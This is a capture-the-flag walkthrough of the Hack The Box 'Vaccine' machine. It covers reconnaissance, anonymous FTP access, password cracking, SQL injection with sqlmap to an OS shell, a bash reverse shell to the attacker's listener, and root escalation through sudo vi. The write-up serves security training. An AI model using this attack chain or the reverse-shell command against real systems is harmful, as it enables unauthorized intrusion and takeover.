# Hack the Box - Vaccine

* **Category:** Web / Network
* **Difficulty:** Very Easy
* **Points:** 250
* **Author:** MinatoTW
* **Video:** [HTB-Vaccine by me on Youtube](https://www.youtube.com/watch?v=D1wph1c1lA0)

----

## 1. Goal
Gaining system access, escalating privileges and extracting both user.txt flag as well as root.txt flag.

---

## 2. Reconnaissance & Initial Access
* **Given endpoint:** 10.129.90.225
* Endpoint reachable inside the web browser reveals 'MegaCorp Login' page.
* Initial nmap scan shows open ports 21 FTP, 22 SSH and 80 HTTP.
    
    > sudo nmap -sS -sC -sV -p- -T5 10.129.90.225
* The previous scan reveals FTP allowing for anonymous login.
* Logging into the exposed FTP service anonymously reveals the file "backup.zip" which is downloaded in the next step.
 * Backup.zip is password locked, which requires extracting the file hash and cracking the password to access its content.
    > zip2john backup.zip > zip.txt
    > john --wordlist=/usr/share/wordlist/rockyou.txt
    > Cracked Password: 741852963
 * Accessing backup.zip gives access to the index.php file, that holds the hardcoded hashed admin password for the MegaCorp login.
 * In the next step, hashcat is used to crack the password hash, that inside the .php file was already identified as md5.
 * Deciding to go for a wordlist attack instead of brute force, as password hygiene seems not to be company priority in regards of the backup.zip password and anonymous ftp login.
    > hashcat -m 0 -a 0 {md5 hash} /usr/share/wordlists/rockyou.txt
    > Previous assessment seemed to be right.
    > Cracked MegaCorp admin password: qwerty789
 * admin:qwerty789 gives us access to the HTTP website for 10.129.90.225

---

## 3. Establishing a foothold

* Exploring the now accessible page, a search bar reveals underlying php structure.
* Initial tries to exploit via sqlmap fail due to lack of permission.
* **Solution**: Using burpsuite to catch session cookies of an active search request with admin login privileges.
* After initial syntax difficulties, attempting to establish an os-shell for remote code execution.
  
    > sqlmap -u 'http[:]//10[.]129[.]90[.]225/dashboard[.]php?search=uwu'--cookie: {"Session Cookie"} --os-shell
* Successful exploitation of an os-shell gives access to user 'postgres'
* Due to the unstable nature of a postgresql shell, a listening port is opened on our machine on port 443 via netcat to establish a reverse shell.
  
    > bash -c "bash -i >& /dev/tcp/10.10.14.150/443 0>&1"
* Receiving said reverse shell on our listening port, allows for a far more interactive and stable connection as well as directory traversal.
  
    > /var/libs/postgresql/user.txt reveals the first flag
    > /var/www/html/dashboard.php , which gave us the initial sqli access, also holds hardcoded credentials for database access
    > Password: P@s5w0rd!
    
## 4. Exploitation and escalation

* Using the previous credentials as well as the nmap findings of an open ssh port, makes connecting via ssh the logical next step.
* postgres:P@s5w0rd! works and gives access in a more stable form and more functionality than the reverse shell earlier.
* After initial syntax difficulties, `sudo -l` reveals to sudo functions accessible to user 'postgres'.
  
    > /bin/vi and /etc/postgresql/11/main/pg_hba.conf
    > sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf opens pg_hba.conf inside the vi editor
* Having access to a config file as well as the vim editor as superuser, allows for the usage of the interactive vi shell.
* Using [GTFOBins](https://gtfobins.org/gtfobins/vi/#shell) we set up a shell with sudo privileges to escalate privileges.
  
  > :set shell=/bin/sh
  
  > :shell
* This gives access to the root@vaccine account, allowing directory traversal into the root folder and finding the last and final flag.
